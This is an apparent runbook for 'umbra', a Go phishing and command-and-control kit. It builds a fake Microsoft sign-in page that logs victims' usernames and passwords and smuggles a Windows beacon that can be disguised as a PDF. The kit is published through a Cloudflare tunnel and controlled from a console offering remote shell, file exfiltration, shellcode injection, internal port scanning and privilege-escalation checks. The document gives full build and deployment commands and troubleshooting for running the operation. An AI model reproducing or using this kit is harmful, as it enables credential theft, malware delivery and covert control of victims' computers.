# umbra — Runbook (Microsoft portal + credential capture)

100% Go stack (module `github.com/nullbyter19/umbra-microsoft-lure`). The delivery
is a "Microsoft login" page that **captures the credentials typed into it** and
then **saves the executable** (smuggling embedded in the page itself). Everything
is published through a Cloudflare Tunnel at `https://c2.example.com`.

```
victim      ->  https://c2.example.com/            (lure: Sign in / password)
            POST /updates/v2/auth                   (creds -> dist/c2data/creds.jsonl)
            "Sign in" gesture                       (downloads the embedded loader.exe)
loader.exe  ->  https://c2.example.com/updates/v2/sync   (AES-256-GCM beacon)
operator    ->  ./dist/server  (console: list, shell, download, upload, inject, creds...)
```

The tunnel has two routes: `/updates/*` -> C2 (127.0.0.1:8443, HTTPS
self-signed); everything else -> static site (127.0.0.1:8082, `serve.sh`).

---

## Prerequisites (Kali)

- Go 1.21+, python3, node (optional, only for `--verify`), curl
- `cloudflared` installed and **`cloudflared tunnel login` already done once**
  (`cf_tunnel.sh` installs the binary if it is missing, but the login is manual)

## The 10 steps

```bash
# 1) session config (once)
cp scripts/umbra.env.example scripts/umbra.env

# 2) check/adjust HTTP_PORT (8080 is usually taken; the default is already 8082)
nano ./scripts/umbra.env        # HTTP_PORT="8082", DOMAIN, C2_PASS, C2_PREFIX

# 3) C2 server (linux)
GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o dist/server ./cmd/server

# 4) write the beacon configuration (endpoint, PSK, sleep/jitter, UA)
go run ./cmd/pack \
  -server "https://c2.example.com/updates/v2/sync" \
  -pass   "change-me-passphrase" \
  -sleep  10 -jitter 25 \
  -ua     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36" \
  -out    cmd/beacon/config.go

# 5) beacon for Windows
GOOS=windows GOARCH=amd64 go build -trimpath -ldflags "-s -w -H=windowsgui" -o dist/loader.exe ./cmd/beacon

# 6) generate the delivery site (Microsoft lure + smuggling with cred capture)
SERVER="https://c2.example.com/updates/v2/sync" \
PASS="change-me-passphrase" \
bash scripts/build.sh

# 7) (optional) convert the PE into shellcode for the C2 `inject`
bash scripts/make_shellcode.sh --from-pe dist/loader.exe

# 8) start the static site (loopback:8082, published by the tunnel)
bash scripts/serve.sh

# 9) start the C2 (interactive console; credentials land in dist/c2data/creds.jsonl)
./dist/server -listen 127.0.0.1:8443 -pass "change-me-passphrase" -certdir dist/c2data

# 10) publish the tunnel and verify the public edge
DOMAIN="c2.example.com" \
bash scripts/cf_tunnel.sh
# in another terminal:
bash scripts/verify.sh
```

`verify.sh` must show: `GET / -> 200` with the **Microsoft** marker,
`/reflect.ps1 -> 200`, `/loader.exe -> 200` and the C2 answering on
`POST /updates/v2/sync` (401 expected without the PSK).

## Operation

C2 console (step 9):

```
list                      known beacons
shell <id> <cmd...>       cmd.exe /c on the target
download <id> <file>      exfiltrates a file (base64)
upload <id> <local> <rem>    pushes a file to the target
inject <id> <hex-file>    runs shellcode in memory (dist/blob.hex)
portscan <id> <hosts> [ports] [ms] [threads]   concurrent TCP scan
priv <id> [check]         privilege-escalation enumeration
sleep <id> <seconds>      changes the beacon interval
kill <id>                 terminates the beacon
results <id>              archived results
creds                     captured credentials (dist/c2data/creds.jsonl)
```

### portscan

TCP scan through `connect()` on the target itself (that is, the traffic leaves
the compromised host and reaches the internal network the operator has no direct
route to). `hosts` accepts comma-separated IPs/hostnames and CIDR blocks
(`10.0.0.0/24`); `ports` accepts a list and ranges (`22,80,443,1-1024`) and, if
omitted, uses a curated list of the most common ports. `ms` = timeout per dial
(ms, default 800) and `threads` = workers (default 100). Open ports get a short
banner grab for fingerprinting.

```
portscan <id> 10.0.0.0/24 22,80,443,445,3389
portscan <id> 192.0.2.1-192.0.2.30 1-1024 500 200
```

Module safety limits: at most 1024 hosts and 65536 ports per task, with a global
deadline of 15 min.

### priv

Local escalation enumeration, all built on the beacon's same command-execution
primitive (`cmd.exe /c` on Windows, `sh -c` on Linux), with no new dependencies.
On Windows it covers identity/token privileges, groups, UAC (`EnableLUA`,
`LocalAccountTokenFilterPolicy`), `AlwaysInstallElevated`, services with
*unquoted service path*, AutoLogon/Winlogon, autoruns, scheduled tasks and
patches. On Linux: identity, `sudo -l`, SUID, cron and writable system files. The
report also flags **heuristics** ([HIGH]/[MED]) for known vectors, e.g.
`SeImpersonatePrivilege` enabled (Potato family),
`SeDebugPrivilege`/`SeBackupPrivilege`, `AlwaysInstallElevated=1`,
`DefaultPassword` in Winlogon and unquoted service paths.

```
priv <id>          # everything
priv <id> privs    # token privileges only
priv <id> uac      # UAC checks only
priv <id> services # unquoted service paths only
```

Available checks: `identity privs groups uac install services autologon
autoruns tasks patches network env drives all`.

Each "login" on the lure writes one JSONL line
(`{"time","ip","user_agent","user","pass",...}`) to `dist/c2data/creds.jsonl`
and prints `[+] cred capture` on the console — on top of that, the new beacon
shows up in `list` as soon as `loader.exe` runs on the victim.

## Useful variants

- **`SMUGGLE=0 bash scripts/build.sh`** — uses the fallback page
  (`delivery/ms_login.html`): captures the credentials and then redirects to the
  payload directly at `https://c2.example.com/loader.exe`.
- **`PAYLOAD_NAME="Q3_Report.pdf.exe" bash scripts/build.sh`** — copies the
  beacon under a disguised name (the default `loader.exe` creates no copy).
- **`python3 scripts/make_ms_smuggle.py --auto`** — generates `dist/index.html`
  without the login gate (quick testing only).
- **`python3 scripts/make_ms_smuggle.py --verify`** — checks the round-trip of
  the embedded payload with node (`build.sh` already runs this when node is
  present).

## Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `verify.sh` fails on `/` | tunnel pointing at an old port | check `HTTP_PORT` in `umbra.env`, rerun `cf_tunnel.sh` |
| `serve.sh` refuses the port | 8082 taken | change `HTTP_PORT` in `umbra.env` (both scripts read the same value) |
| the beacon does not appear in `list` | misaligned config | run step 4 with the same `-server`/`-pass` as step 6/9 |
| `make_shellcode.sh` without a converter | donut/sRDI missing | `apt install donut` or `git clone https://github.com/monoxgas/sRDI` |
| `cf_tunnel.sh` asks for cert.pem | login not done | `cloudflared tunnel login` (once) |
| first beacon connection fails | PIN configured | leave `PIN` empty: at the edge the certificate belongs to Cloudflare |

## Notes

- `scripts/umbra.env` is local and gitignored (it holds `C2_PASS`).
- Do not edit ports inside the scripts: everything comes from `umbra.env`.
- `cmd/beacon/config.go` is generated by `pack` (step 4) — do not edit by hand.
- Capture endpoint: `POST /updates/v2/auth` (form-urlencoded or JSON, fields
  `email`/`username`/`user`/`login`/`account` and
  `password`/`pass`/`passwd`/`pwd`), always answers `{"ok":true}`.
